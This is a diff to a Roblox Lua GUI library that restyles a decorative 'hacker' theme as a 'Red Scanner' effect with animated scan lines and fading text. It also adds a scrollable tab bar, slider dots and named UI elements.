@@ -320,6 +627,7 @@ function Library:CreateLib(name, theme)
     colorsContent.Visible = true
 
     local otherContent = Instance.new("Frame")
+    otherContent.Name = "OtherContent"
     otherContent.Size = UDim2.new(1, 0, 1, -30)
     otherContent.Position = UDim2.new(0, 0, 0, 30)
     otherContent.BackgroundTransparency = 1
@@ -340,33 +648,94 @@ function Library:CreateLib(name, theme)
         otherTabBtn.TextColor3 = CurrentColor
     end)
 
-    local function applyHackerTheme()
-        isNeonHackerTheme = true
-        scanLine.Visible = true
-        scanLine.BackgroundTransparency = 0.7
-        mainStroke.Thickness = 2
+    local function clearHackerLabels()
+        for _, label in ipairs(hackerLabels) do
+            if label and label.Parent then
+                label:Destroy()
+            end
+        end
+        hackerLabels = {}
+    end
+
+    local function spawnHackerText()
+        if not isScannerTheme then return end
+        if not screenGui or not screenGui.Parent then return end
         
-        spawn(function()
-            while isNeonHackerTheme and screenGui.Parent do
-                for i = 0, 1, 0.01 do
-                    if not isNeonHackerTheme then break end
-                    scanLine.Position = UDim2.new(0, 0, i, 0)
-                    task.wait(0.02)
+        local text = HackerCommands[math.random(1, #HackerCommands)]
+        local label = Instance.new("TextLabel")
+        label.Size = UDim2.new(1, 0, 0, 14)
+        label.Position = UDim2.new(0, math.random(-100, 0), math.random(5, 85) / 100, 0)
+        label.BackgroundTransparency = 1
+        label.Text = text
+        label.TextColor3 = CurrentColor
+        label.TextTransparency = 0.6
+        label.TextSize = 10
+        label.Font = Enum.Font.Code
+        label.TextXAlignment = Enum.TextXAlignment.Left
+        label.ZIndex = 1
+        label.Parent = hackerBg
+        
+        table.insert(hackerLabels, label)
+        
+        task.spawn(function()
+            local startTime = tick()
+            while label and label.Parent and tick() - startTime < 5 do
+                if not isScannerTheme then break end
+                local elapsed = tick() - startTime
+                if elapsed > 4 then
+                    label.TextTransparency = 0.6 + (elapsed - 4) * 0.4
                 end
-                for i = 1, 0, -0.01 do
-                    if not isNeonHackerTheme then break end
-                    scanLine.Position = UDim2.new(0, 0, i, 0)
-                    task.wait(0.02)
+                task.wait(0.1)
+            end
+            if label and label.Parent then
+                label:Destroy()
+            end
+            for i, v in ipairs(hackerLabels) do
+                if v == label then
+                    table.remove(hackerLabels, i)
+                    break
                 end
             end
         end)
     end
 
-    local function removeHackerTheme()
-        isNeonHackerTheme = false
+    local function applyScannerTheme()
+        isScannerTheme = true
+        scanLine.Visible = true
+        scanLine.BackgroundTransparency = 0.7
+        mainStroke.Thickness = 2
+        
+        clearHackerLabels()
+        
+        task.spawn(function()
+            while isScannerTheme and screenGui and screenGui.Parent do
+                spawnHackerText()
+                task.wait(math.random(3, 6))
+            end
+        end)
+        
+        task.spawn(function()
+            while isScannerTheme and screenGui and screenGui.Parent do
+                for i = 0, 1, 0.005 do
+                    if not isScannerTheme then break end
+                    scanLine.Position = UDim2.new(0, 0, i, 0)
+                    task.wait(0.01)
+                end
+                for i = 1, 0, -0.005 do
+                    if not isScannerTheme then break end
+                    scanLine.Position = UDim2.new(0, 0, i, 0)
+                    task.wait(0.01)
+                end
+            end
+        end)
+    end
+
+    local function removeScannerTheme()
+        isScannerTheme = false
         scanLine.Visible = false
         scanLine.BackgroundTransparency = 1
         mainStroke.Thickness = 1.5
+        clearHackerLabels()
     end
 
     local function updateAllAccentColors()
@@ -376,13 +745,14 @@ function Library:CreateLib(name, theme)
         
         mainStroke.Color = CurrentColor
         topBarStroke.Color = CurrentColor
+        sfStroke.Color = CurrentColor
         
-        if isNeonHackerTheme then
+        if isScannerTheme then
             scanLine.BackgroundColor3 = CurrentColor
         end
         
         for _, obj in pairs(mainFrame:GetDescendants()) do
-            if obj:IsA("Frame") and obj.BorderSizePixel > 0 then
+            if obj:IsA("Frame") and obj.BorderSizePixel > 0 and obj ~= scanLine then
                 obj.BorderColor3 = CurrentColor
             end
             if obj:IsA("TextButton") then
@@ -393,26 +763,32 @@ function Library:CreateLib(name, theme)
                     end
                 end
             end
-            if obj:IsA("UIStroke") and obj ~= mainStroke and obj ~= topBarStroke then
+            if obj:IsA("UIStroke") and obj ~= mainStroke and obj ~= topBarStroke and obj ~= sfStroke then
                 obj.Color = CurrentColor
             end
-            if obj.Name == "sliderFill" or obj.Name == "toggleIndicator" or obj.Name == "SliderButton" then
+            if obj.Name == "sliderFill" or obj.Name == "toggleIndicator" or obj.Name == "SliderDot" then
                 obj.BackgroundColor3 = CurrentColor
+                obj.BorderColor3 = CurrentColor
             end
             if obj:IsA("TextBox") then
                 obj.BorderColor3 = CurrentColor
                 obj.TextColor3 = CurrentColor
             end
             if obj:IsA("TextLabel") then
-                if obj.BackgroundTransparency == 1 and obj ~= titleLabel then
+                if obj.BackgroundTransparency == 1 and obj.Parent ~= hackerBg then
                     obj.TextColor3 = CurrentColor
                 end
             end
         end
         
         titleLabel.TextColor3 = CurrentColor
-        minBtnFrame.BorderColor3 = CurrentColor
-        minBtnFrame.TextColor3 = CurrentColor
+        resizeHandle.BackgroundColor3 = CurrentColor
+        
+        for _, label in ipairs(hackerLabels) do
+            if label and label.Parent then
+                label.TextColor3 = CurrentColor
+            end
+        end
         
         for _, tab in pairs(Tabs) do
             if tab.Frame then
@@ -450,11 +826,7 @@ function Library:CreateLib(name, theme)
 
         btn.MouseButton1Click:Connect(function()
             CurrentColor = color
-            if Themes[text] and Themes[text].Special then
-                applyHackerTheme()
-            else
-                removeHackerTheme()
-            end
+            removeScannerTheme()
             updateAllAccentColors()
             settingsFrame.Visible = false
         end)
@@ -477,45 +849,34 @@ function Library:CreateLib(name, theme)
     otherTitle.Font = Enum.Font.Code
     otherTitle.Parent = otherContent
 
-    local hackerBtn = Instance.new("TextButton")
-    hackerBtn.Size = UDim2.new(1, -20, 0, 50)
-    hackerBtn.Position = UDim2.new(0, 10, 0, 35)
-    hackerBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    hackerBtn.BorderSizePixel = 2
-    hackerBtn.BorderColor3 = Color3.fromRGB(255, 30, 30)
-    hackerBtn.Text = "☠ NEON RED HACKER ☠"
-    hackerBtn.TextColor3 = Color3.fromRGB(255, 30, 30)
-    hackerBtn.TextSize = 14
-    hackerBtn.Font = Enum.Font.Code
-    hackerBtn.Parent = otherContent
+    local scannerBtn = Instance.new("TextButton")
+    scannerBtn.Size = UDim2.new(1, -20, 0, 40)
+    scannerBtn.Position = UDim2.new(0, 10, 0, 35)
+    scannerBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    scannerBtn.BorderSizePixel = 2
+    scannerBtn.BorderColor3 = Color3.fromRGB(255, 30, 30)
+    scannerBtn.Text = "Red Scanner"
+    scannerBtn.TextColor3 = Color3.fromRGB(255, 30, 30)
+    scannerBtn.TextSize = 14
+    scannerBtn.Font = Enum.Font.Code
+    scannerBtn.Parent = otherContent
 
-    local hackerCorner = Instance.new("UICorner")
-    hackerCorner.CornerRadius = UDim.new(0, 4)
-    hackerCorner.Parent = hackerBtn
+    local scannerCorner = Instance.new("UICorner")
+    scannerCorner.CornerRadius = UDim.new(0, 4)
+    scannerCorner.Parent = scannerBtn
 
-    local hackerGlow = Instance.new("UIStroke")
-    hackerGlow.Color = Color3.fromRGB(255, 30, 30)
-    hackerGlow.Thickness = 2
-    hackerGlow.Parent = hackerBtn
+    local scannerGlow = Instance.new("UIStroke")
+    scannerGlow.Color = Color3.fromRGB(255, 30, 30)
+    scannerGlow.Thickness = 2
+    scannerGlow.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    scannerGlow.Parent = scannerBtn
 
-    hackerBtn.MouseButton1Click:Connect(function()
+    scannerBtn.MouseButton1Click:Connect(function()
         CurrentColor = Color3.fromRGB(255, 30, 30)
-        applyHackerTheme()
+        applyScannerTheme()
         updateAllAccentColors()
         settingsFrame.Visible = false
     end)
-
-    local hackerDesc = Instance.new("TextLabel")
-    hackerDesc.Size = UDim2.new(1, -20, 0, 30)
-    hackerDesc.Position = UDim2.new(0, 10, 0, 90)
-    hackerDesc.BackgroundTransparency = 1
-    hackerDesc.Text = "Features:\n• Scanning line effect\n• Glowing borders\n• Matrix style"
-    hackerDesc.TextColor3 = Color3.fromRGB(255, 30, 30)
-    hackerDesc.TextSize = 11
-    hackerDesc.Font = Enum.Font.Code
-    hackerDesc.TextXAlignment = Enum.TextXAlignment.Left
-    hackerDesc.TextWrapped = true
-    hackerDesc.Parent = otherContent
 
     local transTitle = Instance.new("TextLabel")
     transTitle.Size = UDim2.new(1, -20, 0, 20)
@@ -605,9 +966,7 @@ function Library:CreateLib(name, theme)
         savedPos = Vector2.new(mainFrame.AbsolutePosition.X, mainFrame.AbsolutePosition.Y)
         savedSize = Vector2.new(mainFrame.AbsoluteSize.X, mainFrame.AbsoluteSize.Y)
         mainFrame.Visible = false
-        minBtnPos = Vector2.new(savedPos.X + savedSize.X/2 - 20, savedPos.Y + savedSize.Y/2 - 20)
-        minBtnFrame.Position = UDim2.new(0, minBtnPos.X, 0, minBtnPos.Y)
-        minBtnFrame.Visible = true
+        mainFrame.Position = UDim2.new(0, -9999, 0, -9999)
     end)
 
     hideBtn.MouseButton1Click:Connect(function()
@@ -615,35 +974,37 @@ function Library:CreateLib(name, theme)
         savedPos = Vector2.new(mainFrame.AbsolutePosition.X, mainFrame.AbsolutePosition.Y)
         savedSize = Vector2.new(mainFrame.AbsoluteSize.X, mainFrame.AbsoluteSize.Y)
         mainFrame.Visible = false
-        minBtnPos = Vector2.new(savedPos.X + savedSize.X/2 - 20, savedPos.Y + savedSize.Y/2 - 20)
-        minBtnFrame.Position = UDim2.new(0, minBtnPos.X, 0, minBtnPos.Y)
-        minBtnFrame.Visible = true
+        mainFrame.Position = UDim2.new(0, -9999, 0, -9999)
     end)
 
     closeButton.MouseButton1Click:Connect(function()
-        isNeonHackerTheme = false
+        isScannerTheme = false
+        clearHackerLabels()
         screenGui:Destroy()
     end)
 
     UserInputService.InputBegan:Connect(function(input, gameProcessed)
         if gameProcessed then return end
         if input.KeyCode == Enum.KeyCode.LeftAlt or input.KeyCode == Enum.KeyCode.RightAlt then
-            if isHidden then
+            if isHidden or isMinimized then
                 isHidden = false
+                isMinimized = false
                 mainFrame.Visible = true
-                minBtnFrame.Visible = false
-                local newX = minBtnPos.X - savedSize.X/2 + 20
-                local newY = minBtnPos.Y - savedSize.Y/2 + 20
                 mainFrame.Size = UDim2.new(0, savedSize.X, 0, savedSize.Y)
-                mainFrame.Position = UDim2.new(0, math.clamp(newX, 0, workspace.CurrentCamera.ViewportSize.X - savedSize.X), 0, math.clamp(newY, 0, workspace.CurrentCamera.ViewportSize.Y - savedSize.Y))
+                mainFrame.Position = UDim2.new(0, math.clamp(savedPos.X, 0, workspace.CurrentCamera.ViewportSize.X - savedSize.X), 0, math.clamp(savedPos.Y, 0, workspace.CurrentCamera.ViewportSize.Y - savedSize.Y))
             end
         end
     end)
 
+    mainFrame.DragStopped:Connect(function()
+        savedPos = Vector2.new(mainFrame.AbsolutePosition.X, mainFrame.AbsolutePosition.Y)
+    end)
+
     local resizeHandle = Instance.new("TextButton")
+    resizeHandle.Name = "ResizeHandle"
     resizeHandle.Size = UDim2.new(0, 16, 0, 16)
     resizeHandle.Position = UDim2.new(1, -16, 1, -16)
-    resizeHandle.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+    resizeHandle.BackgroundColor3 = CurrentColor
     resizeHandle.BorderSizePixel = 0
     resizeHandle.Text = ""
     resizeHandle.AutoButtonColor = false
@@ -685,29 +1046,120 @@ function Library:CreateLib(name, theme)
             if resizing then
                 resizing = false
                 mainFrame.Draggable = true
-                resizeHandle.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+                resizeHandle.BackgroundColor3 = CurrentColor
             end
         end
     end)
 
+    local tabContainerOuter = Instance.new("Frame")
+    tabContainerOuter.Name = "TabContainerOuter"
+    tabContainerOuter.Size = UDim2.new(1, -10, 0, 35)
+    tabContainerOuter.Position = UDim2.new(0, 5, 0, 30)
+    tabContainerOuter.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    tabContainerOuter.BorderSizePixel = 0
+    tabContainerOuter.Parent = mainFrame
+    tabContainerOuter.ZIndex = 10
+    tabContainerOuter.ClipsDescendants = true
+
+    local tabScrollLeft = Instance.new("TextButton")
+    tabScrollLeft.Name = "TabScrollLeft"
+    tabScrollLeft.Size = UDim2.new(0, 16, 1, 0)
+    tabScrollLeft.Position = UDim2.new(0, 0, 0, 30)
+    tabScrollLeft.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    tabScrollLeft.BorderSizePixel = 1
+    tabScrollLeft.BorderColor3 = CurrentColor
+    tabScrollLeft.Text = "<"
+    tabScrollLeft.TextColor3 = CurrentColor
+    tabScrollLeft.TextSize = 12
+    tabScrollLeft.Font = Enum.Font.Code
+    tabScrollLeft.Parent = mainFrame
+    tabScrollLeft.ZIndex = 11
+    tabScrollLeft.Visible = false
+
+    local tabScrollRight = Instance.new("TextButton")
+    tabScrollRight.Name = "TabScrollRight"
+    tabScrollRight.Size = UDim2.new(0, 16, 1, 0)
+    tabScrollRight.Position = UDim2.new(1, -16, 0, 30)
+    tabScrollRight.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    tabScrollRight.BorderSizePixel = 1
+    tabScrollRight.BorderColor3 = CurrentColor
+    tabScrollRight.Text = ">"
+    tabScrollRight.TextColor3 = CurrentColor
+    tabScrollRight.TextSize = 12
+    tabScrollRight.Font = Enum.Font.Code
+    tabScrollRight.Parent = mainFrame
+    tabScrollRight.ZIndex = 11
+    tabScrollRight.Visible = false
+
     local tabContainer = Instance.new("Frame")
     tabContainer.Name = "TabContainer"
-    tabContainer.Size = UDim2.new(1, 0, 0, 35)
-    tabContainer.Position = UDim2.new(0, 0, 0, 30)
+    tabContainer.Size = UDim2.new(1, 0, 1, 0)
+    tabContainer.Position = UDim2.new(0, 0, 0, 0)
     tabContainer.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
     tabContainer.BorderSizePixel = 0
-    tabContainer.Parent = mainFrame
+    tabContainer.Parent = tabContainerOuter
+    tabContainer.ZIndex = 10
 
-    local uiListLayout = Instance.new("UIListLayout")
-    uiListLayout.FillDirection = Enum.FillDirection.Horizontal
-    uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
-    uiListLayout.Padding = UDim.new(0, 2)
-    uiListLayout.Parent = tabContainer
+    local tabListLayout = Instance.new("UIListLayout")
+    tabListLayout.FillDirection = Enum.FillDirection.Horizontal
+    tabListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+    tabListLayout.Padding = UDim.new(0, 2)
+    tabListLayout.Parent = tabContainer
 
-    local uiPadding = Instance.new("UIPadding")
-    uiPadding.PaddingLeft = UDim.new(0, 5)
-    uiPadding.PaddingTop = UDim.new(0, 3)
-    uiPadding.Parent = tabContainer
+    local tabPadding = Instance.new("UIPadding")
+    tabPadding.PaddingLeft = UDim.new(0, 3)
+    tabPadding.PaddingTop = UDim.new(0, 3)
+    tabPadding.Parent = tabContainer
+
+    local function updateTabScroll()
+        local totalWidth = 0
+        for _, btn in ipairs(TabButtons) do
+            if btn and btn.Parent then
+                totalWidth = totalWidth + btn.AbsoluteSize.X + 2
+            end
+        end
+        local visibleWidth = tabContainerOuter.AbsoluteSize.X
+        maxTabScroll = math.max(0, totalWidth - visibleWidth + 6)
+        
+        if maxTabScroll > 0 then
+            tabScrollLeft.Visible = true
+            tabScrollRight.Visible = true
+            tabContainerOuter.Size = UDim2.new(1, -42, 0, 35)
+            tabContainerOuter.Position = UDim2.new(0, 21, 0, 30)
+        else
+            tabScrollLeft.Visible = false
+            tabScrollRight.Visible = false
+            tabContainerOuter.Size = UDim2.new(1, -10, 0, 35)
+            tabContainerOuter.Position = UDim2.new(0, 5, 0, 30)
+            tabContainer.Position = UDim2.new(0, 0, 0, 0)
+            tabScrollPosition = 0
+        end
+    end
+
+    tabScrollLeft.MouseButton1Click:Connect(function()
+        tabScrollPosition = math.max(0, tabScrollPosition - 100)
+        TweenService:Create(tabContainer, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {Position = UDim2.new(0, -tabScrollPosition, 0, 0)}):Play()
+    end)
+
+    tabScrollRight.MouseButton1Click:Connect(function()
+        tabScrollPosition = math.min(maxTabScroll, tabScrollPosition + 100)
+        TweenService:Create(tabContainer, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {Position = UDim2.new(0, -tabScrollPosition, 0, 0)}):Play()
+    end)
+
+    UserInputService.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseWheel then
+            local mousePos = UserInputService:GetMouseLocation()
+            local tabOuterPos = tabContainerOuter.AbsolutePosition
+            local tabOuterSize = tabContainerOuter.AbsoluteSize
+            if mousePos.X >= tabOuterPos.X and mousePos.X <= tabOuterPos.X + tabOuterSize.X and
+               mousePos.Y >= tabOuterPos.Y and mousePos.Y <= tabOuterPos.Y + tabOuterSize.Y then
+                if maxTabScroll > 0 then
+                    tabScrollPosition = math.clamp(tabScrollPosition - input.Position.Z * 30, 0, maxTabScroll)
+                    TweenService:Create(tabContainer, TweenInfo.new(0.1, Enum.EasingStyle.Quad), {Position = UDim2.new(0, -tabScrollPosition, 0, 0)}):Play()
+                end
+            end
+        end
+    end)
 
     local ColumnsFrame = Instance.new("Frame")
     ColumnsFrame.Name = "ColumnsFrame"
@@ -715,14 +1167,18 @@ function Library:CreateLib(name, theme)
     ColumnsFrame.Position = UDim2.new(0, 0, 0, 65)
     ColumnsFrame.BackgroundTransparency = 1
     ColumnsFrame.Parent = mainFrame
+    ColumnsFrame.ZIndex = 10
 
     function UIElements.updateTabSizes()
         local numTabs = #TabButtons
         if numTabs > 0 then
-            local width = 1 / numTabs
             for _, btn in ipairs(TabButtons) do
-                btn.Size = UDim2.new(width, -2, 1, -6)
+                if btn and btn.Parent then
+                    local textSize = TextService:GetTextSize(btn.Text, btn.TextSize, btn.Font, Vector2.new(10000, 100))
+                    btn.Size = UDim2.new(0, textSize.X + 24, 1, -6)
+                end
             end
+            updateTabScroll()
         end
     end
 
@@ -740,7 +1196,10 @@ function Library:CreateLib(name, theme)
         tabButton.TextColor3 = (tabCount == 1) and CurrentColor or Color3.fromRGB(140, 140, 140)
         tabButton.TextSize = 14
         tabButton.Font = Enum.Font.Code
+        tabButton.TextXAlignment = Enum.TextXAlignment.Center
         tabButton.Parent = tabContainer
+        tabButton.ClipsDescendants = false
+        tabButton.ZIndex = 10
 
         local tabCorner = Instance.new("UICorner")
         tabCorner.CornerRadius = UDim.new(0, 4)
@@ -761,6 +1220,7 @@ function Library:CreateLib(name, theme)
         section.AutomaticCanvasSize = Enum.AutomaticSize.Y
         section.Parent = ColumnsFrame
         section.Visible = (tabCount == 1)
+        section.ZIndex = 10
 
         local container = Instance.new("Frame")
         container.Name = "Container_" .. TabCounter
@@ -785,6 +1245,7 @@ function Library:CreateLib(name, theme)
         if tabCount == 1 then
             CurrentTab = tabKey
             local line = Instance.new("Frame")
+            line.Name = "ActiveLine"
             line.Size = UDim2.new(1, 0, 0, 2)
             line.Position = UDim2.new(0, 0, 1, -2)
             line.BackgroundColor3 = CurrentColor
@@ -805,6 +1266,7 @@ function Library:CreateLib(name, theme)
             end
 
             local line = Instance.new("Frame")
+            line.Name = "ActiveLine"
             line.Size = UDim2.new(1, 0, 0, 2)
             line.Position = UDim2.new(0, 0, 1, -2)
             line.BackgroundColor3 = CurrentColor
@@ -830,17 +1292,18 @@ function Library:CreateLib(name, theme)
             local yPos = tabData.YPosition
 
             local sectionTitle = Instance.new("TextLabel")
+            sectionTitle.Name = "SectionTitle"
             sectionTitle.Size = UDim2.new(1, 0, 0, 30)
             sectionTitle.Position = UDim2.new(0, 0, 0, yPos)
             sectionTitle.BackgroundTransparency = 1
             sectionTitle.Text = "// " .. sectionName
             sectionTitle.TextColor3 = CurrentColor
-            sectionTitle.TextSize = 16
-            sectionTitle.Font = Enum.Font.Code
+            sectionTitle.TextSize = 16            sectionTitle.Font = Enum.Font.Code
             sectionTitle.TextXAlignment = Enum.TextXAlignment.Left
             sectionTitle.Parent = container
 
             local sectionLine = Instance.new("Frame")
+            sectionLine.Name = "SectionLine"
             sectionLine.Size = UDim2.new(1, 0, 0, 1)
             sectionLine.Position = UDim2.new(0, 0, 0, yPos + 28)
             sectionLine.BackgroundColor3 = CurrentColor
@@ -984,6 +1447,7 @@ function Library:CreateLib(name, theme)
                 local currentY = tabData.YPosition
 
                 local buttonFrame = Instance.new("Frame")
+                buttonFrame.Name = "ButtonFrame"
                 buttonFrame.Size = UDim2.new(1, 0, 0, 60)
                 buttonFrame.Position = UDim2.new(0, 0, 0, currentY)
                 buttonFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
@@ -996,6 +1460,7 @@ function Library:CreateLib(name, theme)
                 frameCorner.Parent = buttonFrame
 
                 local nameLabel = Instance.new("TextLabel")
+                nameLabel.Name = "ButtonNameLabel"
                 nameLabel.Size = UDim2.new(1, -20, 0, 25)
                 nameLabel.Position = UDim2.new(0, 10, 0, 5)
                 nameLabel.BackgroundTransparency = 1
@@ -1007,6 +1472,7 @@ function Library:CreateLib(name, theme)
                 nameLabel.Parent = buttonFrame
 
                 local descLabel = Instance.new("TextLabel")
+                descLabel.Name = "ButtonDescLabel"
                 descLabel.Size = UDim2.new(1, -20, 0, 20)
                 descLabel.Position = UDim2.new(0, 10, 0, 30)
                 descLabel.BackgroundTransparency = 1
@@ -1050,6 +1516,7 @@ function Library:CreateLib(name, theme)
                 local toggleId = tostring(math.random(10000, 99999))
 
                 local toggleFrame = Instance.new("Frame")
+                toggleFrame.Name = "ToggleFrame"
                 toggleFrame.Size = UDim2.new(1, 0, 0, 50)
                 toggleFrame.Position = UDim2.new(0, 0, 0, currentY)
                 toggleFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
@@ -1062,6 +1529,7 @@ function Library:CreateLib(name, theme)
                 frameCorner.Parent = toggleFrame
 
                 local nameLabel = Instance.new("TextLabel")
+                nameLabel.Name = "ToggleNameLabel"
                 nameLabel.Size = UDim2.new(1, -80, 0, 25)
                 nameLabel.Position = UDim2.new(0, 10, 0, 5)
                 nameLabel.BackgroundTransparency = 1
@@ -1073,6 +1541,7 @@ function Library:CreateLib(name, theme)
                 nameLabel.Parent = toggleFrame
 
                 local descLabel = Instance.new("TextLabel")
+                descLabel.Name = "ToggleDescLabel"
                 descLabel.Size = UDim2.new(1, -80, 0, 20)
                 descLabel.Position = UDim2.new(0, 10, 0, 25)
                 descLabel.BackgroundTransparency = 1
@@ -1084,6 +1553,7 @@ function Library:CreateLib(name, theme)
                 descLabel.Parent = toggleFrame
 
                 local toggleBg = Instance.new("Frame")
+                toggleBg.Name = "ToggleBg"
                 toggleBg.Size = UDim2.new(0, 50, 0, 24)
                 toggleBg.Position = UDim2.new(1, -60, 0.5, -12)
                 toggleBg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
@@ -1096,6 +1566,7 @@ function Library:CreateLib(name, theme)
                 bgCorner.Parent = toggleBg
 
                 local toggleIndicator = Instance.new("Frame")
+                toggleIndicator.Name = "toggleIndicator"
                 toggleIndicator.Size = UDim2.new(0, 20, 0, 16)
                 toggleIndicator.Position = UDim2.new(0, 2, 0.5, -8)
                 toggleIndicator.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
@@ -1151,6 +1622,7 @@ function Library:CreateLib(name, theme)
                 local sliderId = tostring(math.random(10000, 99999))
 
                 local sliderFrame = Instance.new("Frame")
+                sliderFrame.Name = "SliderFrame"
                 sliderFrame.Size = UDim2.new(1, 0, 0, 70)
                 sliderFrame.Position = UDim2.new(0, 0, 0, currentY)
                 sliderFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
@@ -1163,6 +1635,7 @@ function Library:CreateLib(name, theme)
                 frameCorner.Parent = sliderFrame
 
                 local nameLabel = Instance.new("TextLabel")
+                nameLabel.Name = "SliderNameLabel"
                 nameLabel.Size = UDim2.new(1, -20, 0, 25)
                 nameLabel.Position = UDim2.new(0, 10, 0, 5)
                 nameLabel.BackgroundTransparency = 1
@@ -1174,6 +1647,7 @@ function Library:CreateLib(name, theme)
                 nameLabel.Parent = sliderFrame
 
                 local descLabel = Instance.new("TextLabel")
+                descLabel.Name = "SliderDescLabel"
                 descLabel.Size = UDim2.new(1, -20, 0, 20)
                 descLabel.Position = UDim2.new(0, 10, 0, 25)
                 descLabel.BackgroundTransparency = 1
@@ -1185,6 +1659,7 @@ function Library:CreateLib(name, theme)
                 descLabel.Parent = sliderFrame
 
                 local valueBox = Instance.new("TextBox")
+                valueBox.Name = "SliderValueBox"
                 valueBox.Size = UDim2.new(0, 50, 0, 20)
                 valueBox.Position = UDim2.new(1, -60, 0, 28)
                 valueBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
@@ -1201,6 +1676,7 @@ function Library:CreateLib(name, theme)
                 valCorner.Parent = valueBox
 
                 local sliderBg = Instance.new("Frame")
+                sliderBg.Name = "SliderBg"
                 sliderBg.Size = UDim2.new(1, -80, 0, 10)
                 sliderBg.Position = UDim2.new(0, 10, 0, 50)
                 sliderBg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
@@ -1223,6 +1699,20 @@ function Library:CreateLib(name, theme)
                 fillCorner.CornerRadius = UDim.new(0, 5)
                 fillCorner.Parent = sliderFill
 
+                local sliderDot = Instance.new("Frame")
+                sliderDot.Name = "SliderDot"
+                sliderDot.Size = UDim2.new(0, 14, 0, 14)
+                sliderDot.Position = UDim2.new(0, -7, 0.5, -7)
+                sliderDot.BackgroundColor3 = CurrentColor
+                sliderDot.BorderSizePixel = 1
+                sliderDot.BorderColor3 = CurrentColor
+                sliderDot.Parent = sliderBg
+                sliderDot.ZIndex = 2
+
+                local dotCorner = Instance.new("UICorner")
+                dotCorner.CornerRadius = UDim.new(1, 0)
+                dotCorner.Parent = sliderDot
+
                 local sliderButton = Instance.new("TextButton")
                 sliderButton.Size = UDim2.new(1, 0, 1, 0)
                 sliderButton.BackgroundTransparency = 1
@@ -1233,9 +1723,10 @@ function Library:CreateLib(name, theme)
                 local dragging = false
 
                 local function setSliderValue(value)
-                    currentValue = math.clamp(value, min, max)
+                    currentValue = math.clamp(math.floor(value), min, max)
                     local percent = (currentValue - min) / (max - min)
                     sliderFill.Size = UDim2.new(percent, 0, 1, 0)
+                    sliderDot.Position = UDim2.new(percent, -7, 0.5, -7)
                     valueBox.Text = tostring(currentValue)
                     SliderValues[sliderId] = currentValue
                     if callback then
@@ -1253,7 +1744,7 @@ function Library:CreateLib(name, theme)
                     local absSize = sliderBg.AbsoluteSize.X
                     local relativeX = math.clamp(mousePos.X - absPos.X, 0, absSize)
                     local percent = relativeX / absSize
-                    local value = math.floor(min + (max - min) * percent)
+                    local value = min + (max - min) * percent
                     setSliderValue(value)
                 end
 
@@ -1291,6 +1782,10 @@ function Library:CreateLib(name, theme)
                     return currentValue
                 end
 
+                function SectionObject:SetSliderValue(value)
+                    setSliderValue(value)
+                end
+
                 tabData.YPosition = currentY + 80
                 tabData.Frame.CanvasSize = UDim2.new(0, 0, 0, tabData.YPosition + 10)
                 return sliderFrame
@@ -1304,6 +1799,7 @@ function Library:CreateLib(name, theme)
                 local dropdownContent
 
                 dropdownFrame = Instance.new("Frame")
+                dropdownFrame.Name = "DropdownFrame"
                 dropdownFrame.Size = UDim2.new(1, 0, 0, 50)
                 dropdownFrame.Position = UDim2.new(0, 0, 0, currentY)
                 dropdownFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
@@ -1496,6 +1992,7 @@ function Library:CreateLib(name, theme)
                     bgCorner.Parent = toggleBg
 
                     local toggleIndicator = Instance.new("Frame")
+                    toggleIndicator.Name = "toggleIndicator"
                     toggleIndicator.Size = UDim2.new(0, 20, 0, 16)
                     toggleIndicator.Position = UDim2.new(0, 2, 0.5, -8)
                     toggleIndicator.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
@@ -1622,6 +2119,20 @@ function Library:CreateLib(name, theme)
                     fillCorner.CornerRadius = UDim.new(0, 5)
                     fillCorner.Parent = sliderFill
 
+                    local sliderDot = Instance.new("Frame")
+                    sliderDot.Name = "SliderDot"
+                    sliderDot.Size = UDim2.new(0, 14, 0, 14)
+                    sliderDot.Position = UDim2.new(0, -7, 0.5, -7)
+                    sliderDot.BackgroundColor3 = CurrentColor
+                    sliderDot.BorderSizePixel = 1
+                    sliderDot.BorderColor3 = CurrentColor
+                    sliderDot.Parent = sliderBg
+                    sliderDot.ZIndex = 2
+
+                    local dotCorner = Instance.new("UICorner")
+                    dotCorner.CornerRadius = UDim.new(1, 0)
+                    dotCorner.Parent = sliderDot
+
                     local sliderButton = Instance.new("TextButton")
                     sliderButton.Size = UDim2.new(1, 0, 1, 0)
                     sliderButton.BackgroundTransparency = 1
@@ -1632,9 +2143,10 @@ function Library:CreateLib(name, theme)
                     local dragging = false
 
                     local function setSliderValue(value)
-                        currentValue = math.clamp(value, min, max)
+                        currentValue = math.clamp(math.floor(value), min, max)
                         local percent = (currentValue - min) / (max - min)
                         sliderFill.Size = UDim2.new(percent, 0, 1, 0)
+                        sliderDot.Position = UDim2.new(percent, -7, 0.5, -7)
                         valueBox.Text = tostring(currentValue)
                         SliderValues[sliderId] = currentValue
                         if callback then
@@ -1652,7 +2164,7 @@ function Library:CreateLib(name, theme)
                         local absSize = sliderBg.AbsoluteSize.X
                         local relativeX = math.clamp(mousePos.X - absPos.X, 0, absSize)
                         local percent = relativeX / absSize
-                        local value = math.floor(min + (max - min) * percent)
+                        local value = min + (max - min) * percent
                         setSliderValue(value)
                     end
 
@@ -1705,6 +2217,7 @@ function Library:CreateLib(name, theme)
                 local height = math.max(60, 40 + lines * 20)
 
                 local textFrame = Instance.new("Frame")
